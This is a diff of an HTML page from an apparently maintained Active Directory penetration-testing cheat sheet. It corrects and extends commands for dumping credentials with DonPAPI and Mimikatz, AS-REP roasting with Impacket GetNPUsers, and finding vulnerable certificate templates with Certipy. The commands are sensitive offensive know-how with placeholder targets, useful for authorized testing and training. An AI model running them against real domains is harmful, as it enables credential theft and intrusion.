@@ -976,7 +976,7 @@ sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> <
 </ul>
 <h3 id="dumping-credentials_1">Dumping Credentials</h3>
 <p>Dump credentials and other secrets (cookies, certificates, etc.) remotely with <a href="https://github.com/login-securite/DonPAPI">DonPAPI</a>:</p>
-<div class="highlight"><pre><span></span><code>donpapi<span class="w"> </span>collect<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-d<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-t<span class="w"> </span>&lt;target&gt;
+<div class="highlight"><pre><span></span><code>donpapi<span class="w"> </span>collect<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-d<span class="w"> </span>&lt;domain&gt;<span class="w"> </span>-t<span class="w"> </span>&lt;target&gt;
 </code></pre></div>
 <p>Dump credentials and other secrets with <code>Invoke-Mimikatz</code>:</p>
 <div class="highlight"><pre><span></span><code><span class="c"># Dump credentials on a local machine.</span>
@@ -1285,7 +1285,12 @@ GetUserSPNs.py<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span 
 <span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="p">{</span><span class="n">DoesNotRequirePreAuth</span> <span class="o">-eq</span> <span class="nv">$True</span><span class="p">}</span> <span class="n">-Properties</span> <span class="n">DoesNotRequirePreAuth</span>
 </code></pre></div>
 <p>Enumerate accounts  with Kerberos pre-authentication disabled and dump TGS with Impacket's <code>GetNPUsers</code>:</p>
-<div class="highlight"><pre><span></span><code>GetNPUsers.py<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>ip&gt;<span class="w"> </span>&lt;domain&gt;/&lt;user&gt;
+<div class="highlight"><pre><span></span><code><span class="c1"># Without password</span>
+impacket-GetNPUsers<span class="w"> </span>-no-pass<span class="w"> </span>&lt;domain&gt;/&lt;user&gt;
+impacket-GetNPUsers<span class="w"> </span>-no-pass<span class="w"> </span>-usersfile<span class="w"> </span>&lt;list<span class="w"> </span>of<span class="w"> </span>users&gt;<span class="w"> </span>&lt;domain&gt;/<span class="w"> </span>
+
+<span class="c1"># With password</span>
+GetNPUsers.py<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>ip&gt;<span class="w"> </span>&lt;domain&gt;/&lt;user&gt;
 
 GetNPUsers.py<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>ip&gt;<span class="w"> </span>-usersfile<span class="w"> </span>&lt;list<span class="w"> </span>of<span class="w"> </span>users&gt;<span class="w"> </span>&lt;domain&gt;/<span class="w"> </span>
 </code></pre></div>
@@ -1852,10 +1857,13 @@ lsadump::sam
 certutil<span class="w"> </span>-v<span class="w"> </span>-dstemplate<span class="w"> </span>&gt;<span class="w"> </span>template.txt
 </code></pre></div>
 <p>Enumerate CA and Certificate Templates remotely with <a href="https://github.com/ly4k/Certipy">Certipy-AD</a>:</p>
-<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>find<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>IP&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;@domain&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-json
+<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>find<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>IP&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;@domain&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-vulnerable
+-json<span class="w"> </span><span class="o">[</span>-old-bloodhound<span class="o">]</span>
 </code></pre></div>
+<p><strong>Note</strong>: <code>-old-bloodhound</code> option generates files to be ingested by BloodHound.</p>
+<p>Some useful BloodHound queries can be found <a href="https://github.com/ly4k/Certipy/blob/main/customqueries.json">here</a>.</p>
 <h4 id="esc1">ESC1</h4>
-<p>Manually enumerate potential <strong>ESC1</strong> vulnereable certificate templates:</p>
+<p>Manually enumerate potential <strong>ESC1</strong> vulnerable certificate templates:</p>
 <div class="highlight"><pre><span></span><code><span class="p">(</span>&amp;<span class="p">(</span><span class="nv">objectclass</span><span class="o">=</span><span class="nv">pkicertificatetemplate</span><span class="p">)(</span><span class="o">!</span><span class="p">(</span><span class="nv">mspki</span><span class="o">-</span><span class="nv">enrollment</span><span class="o">-</span>
 <span class="nv">flag</span><span class="o">:</span><span class="mf">1.2</span><span class="o">.</span><span class="mf">840.113556</span><span class="o">.</span><span class="mf">1.4</span><span class="o">.</span><span class="mi">804</span><span class="o">:=</span><span class="mi">2</span><span class="p">))(</span><span class="o">|</span><span class="p">(</span><span class="nv">mspki</span><span class="o">-</span><span class="nv">ra</span><span class="o">-</span><span class="nv">signature</span><span class="o">=</span><span class="mi">0</span><span class="p">)(</span><span class="o">!</span><span class="p">(</span><span class="nv">mspki</span><span class="o">-</span><span class="nv">ra</span><span class="o">-</span>
 <span class="nv">signature</span><span class="o">=*</span><span class="p">)))(</span><span class="o">|</span><span class="p">(</span><span class="nv">pkiextendedkeyusage</span><span class="o">=</span><span class="mf">1.3</span><span class="o">.</span><span class="mf">6.1</span><span class="o">.</span><span class="mf">4.1</span><span class="o">.</span><span class="mf">311.20</span><span class="o">.</span><span class="mf">2.2</span><span class="p">)(</span><span class="nv">pkiextend</span>
